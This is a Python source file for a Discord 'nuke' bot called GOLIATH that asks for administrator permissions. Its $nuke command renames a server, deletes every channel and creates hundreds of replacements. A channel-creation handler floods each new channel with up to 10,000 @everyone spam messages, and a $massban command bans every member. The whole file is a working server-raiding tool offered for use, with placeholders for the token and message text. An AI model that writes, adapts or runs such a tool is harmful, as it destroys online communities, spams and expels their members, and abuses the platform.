import aiohttp
import asyncio
import random
import discord
from discord.ext import commands
from pystyle import Colorate, Colors

intents = discord.Intents.all()
TOKEN = "TOKEN HERE"
GOLIATH = commands.AutoShardedBot(command_prefix='$', shard_count=1, intents=intents)

CHANNEL_NAMES = ["input", "your", "channels", "names", "formatted", "like", "this"]
MESSAGE_CONTENT = """@everyone
Your non-embed message content here"""
EMBED_TITLE = "Your embed title here"
EMBED_DESCRIPTION = "Desc here"
EMBED_FOOTER = "Footer here"
EMBED_THUMBNAIL = "https://cdn.discordapp.com/attachments/1327921469552070746/1338112843660394556/chudjak-chud.gif?ex=67ce2772&is=67ccd5f2&hm=396c1be63f785bdbf5bad1254a4db10c3ad23d5137ecb1d29de0da7bb056fcc6&"
BAN_REASON = "Ur ban reason here"
@GOLIATH.event
async def on_ready():
    Banner = '''
═══════════════════════════════════════════════════════════════════════════════
  ▄▄█▀▀▀█▄█  ▄▄█▀▀██▄ ▀████▀    ▀████▀     ██     ███▀▀██▀▀███████▀  ▀████▀▀
▄██▀     ▀█▄██▀    ▀██▄ ██        ██      ▄██▄    █▀   ██   ▀█ ██      ██   
██▀       ▀██▀      ▀██ ██        ██     ▄█▀██▄        ██      ██      ██   
██         ██        ██ ██        ██    ▄█  ▀██        ██      ██████████   
██▄    ▀█████▄      ▄██ ██     ▄  ██    ████████       ██      ██      ██   
▀██▄     ██▀██▄    ▄██▀ ██    ▄█  ██   █▀      ██      ██      ██      ██   
  ▀▀███████  ▀▀████▀▀ ███████████ ███▄███▄   ▄████▄  ▄████▄  ▄████▄  ▄████▄▄
═══════════════════════════════════════════════════════════════════════════════
'''
    bot_info = f'''
[+] Username: {GOLIATH.user.name}
[+] User ID: {GOLIATH.user.id}
[+] Scope: https://discord.com/oauth2/authorize?client_id={GOLIATH.user.id}&scope=bot&permissions=8
[+] Guilds: {len(GOLIATH.guilds)}
[+] Author : Lambdaist & Aethernus
'''

    print(Colorate.Color(Colors.red, Banner, True))
    print(Colorate.Color(Colors.red, bot_info, True))

@GOLIATH.command()
async def nuke(ctx):
    await ctx.message.delete()
    await ctx.guild.edit(name="server name here")

    async def delete_channels():
        tasks = []
        for channel in ctx.guild.channels:
            try:
                task = asyncio.create_task(channel.delete())
                tasks.append(task)
                print(Colorate.Color(Colors.red, f"{channel.name} deleted", True))
                await asyncio.sleep(0.2)
            except discord.Forbidden:
                print(Colorate.Color(Colors.red, f"Failed to delete {channel.name}", True))
        await asyncio.gather(*tasks)

    async def create_channels():
        tasks = []
        for i in range(50):
            for channel_name in random.sample(CHANNEL_NAMES, len(CHANNEL_NAMES)):
                task = asyncio.create_task(ctx.guild.create_text_channel(channel_name))
                tasks.append(task)
                print(Colorate.Color(Colors.green, f"{channel_name} created", True))
                await asyncio.sleep(0.2)
        await asyncio.gather(*tasks)

    try:
        await asyncio.gather(delete_channels(), create_channels())
    except Exception as e:
        print(Colorate.Color(Colors.red, f"Error: {e}", True))

@GOLIATH.event
async def on_guild_channel_create(channel):
    tasks = []
    for _ in range(10000):
        embed = discord.Embed(
            title=EMBED_TITLE,
            description=EMBED_DESCRIPTION,
            color=discord.Color.dark_red()
        )
        embed.set_footer(text=EMBED_FOOTER)
        embed.set_thumbnail(url=EMBED_THUMBNAIL)

        headers = {"Authorization": f"Bot {TOKEN}"}
        async with aiohttp.ClientSession() as session:
            try:
                async with session.post(
                    f"https://discord.com/api/v9/channels/{channel.id}/messages",
                    json={"content": MESSAGE_CONTENT, "embed": embed.to_dict()},
                    headers=headers,
                ) as response:
                    if response.status == 200:
                        print(Colorate.Color(Colors.green, f"Message sent", True))
                    else:
                        print(Colorate.Color(Colors.red, f"Failed to send message", True))
            except Exception as e:
                print(Colorate.Color(Colors.red, f"Error: {e}", True))
        await asyncio.sleep(1.2)


@GOLIATH.command()
async def massban(ctx):
    for member in ctx.guild.members:
        try:
            await member.ban(reason=BAN_REASON)
            print(Colorate.Color(Colors.red, f"Banned {member.name}", True))
        except discord.Forbidden:
            print(Colorate.Color(Colors.red, f"Failed to ban {member.name}", True))
        await asyncio.sleep(0.2)
